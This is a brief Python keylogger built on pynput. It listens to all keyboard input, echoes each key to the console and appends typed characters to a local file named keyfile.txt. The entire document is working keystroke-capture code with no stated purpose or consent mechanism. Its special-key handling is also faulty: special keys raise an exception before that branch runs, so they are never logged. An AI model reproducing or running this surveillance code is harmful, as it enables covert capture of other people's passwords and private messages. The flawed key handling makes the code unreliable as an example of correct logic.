from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            if char:
                logKey.write(char)
            else:
                # Handle special keys like space, backspace, and enter
                if key == keyboard.Key.space:
                    logKey.write(' ')
                elif key == keyboard.Key.backspace:
                    logKey.write(' [BACKSPACE] ')
                elif key == keyboard.Key.enter:
                    logKey.write(' [ENTER] ')
                elif key == keyboard.Key.shift:
                    logKey.write(' [SHIFT] ')
                elif key == keyboard.Key.caps_lock:
                    logKey.write(' [CAPS_LOCK] ')
                else:
                    # For any other special keys, write their name
                    logKey.write(f' [{key}] ')
        except AttributeError:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
